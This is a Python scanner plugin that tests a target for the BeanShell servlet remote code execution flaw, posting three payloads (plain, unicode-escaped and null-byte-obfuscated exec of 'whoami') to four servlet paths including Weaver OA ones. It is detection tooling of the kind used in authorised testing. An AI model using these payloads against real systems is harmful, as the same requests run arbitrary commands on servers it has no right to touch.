import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging
import urllib3


urllib3.disable_warnings()

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0',
    'Content-Type': 'application/x-www-form-urlencoded',
}
def Bsh_RCE(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port)
    Url_Payload1 = "/bsh.servlet.BshServlet"
    Url_Payload2 = "/weaver/bsh.servlet.BshServlet"
    Url_Payload3 = "/weaveroa/bsh.servlet.BshServlet"
    Url_Payload4 = "/oa/bsh.servlet.BshServlet"

    Data_Payload1 = """bsh.script=exec("whoami");&bsh.servlet.output=raw"""
    Data_Payload2 = """bsh.script=\u0065\u0078\u0065\u0063("whoami");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw"""
    Data_Payload3 = """bsh.script=eval%00("ex"%2b"ec(bsh.httpServletRequest.getParameter(\\"command\\"))");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw&command=whoami"""
    requests.packages.urllib3.disable_warnings()
    for Url_Payload in (Url_Payload1, Url_Payload2, Url_Payload3, Url_Payload4):
        url = urldata + Url_Payload
        for Data_payload in (Data_Payload1, Data_Payload2, Data_Payload3):
            try:
                http_response = requests.post(url, data=Data_payload, headers=headers, verify=False)
                if http_response.status_code == 200:
                    if ";</script>" not in (http_response.content):
                        if "Login.jsp" not in (http_response.content):
                            if "Error" not in (http_response.content):
                                print(Vcolors.RED + "[!] 存在Beanshell RCE漏洞\r" + Vcolors.ENDC)
                                print(Vcolors.RED + "[!] 可Post手动传值测试: {}\r".format(Data_payload) + Vcolors.ENDC)
                                return
            except Exception as e:
                # print(e)
                logging.error("Bsh_RCE脚本出现异常")
    else:
        print(Vcolors.WARNING + "[x] 不存在Beanshell RCE漏洞" + Vcolors.ENDC)
  
        


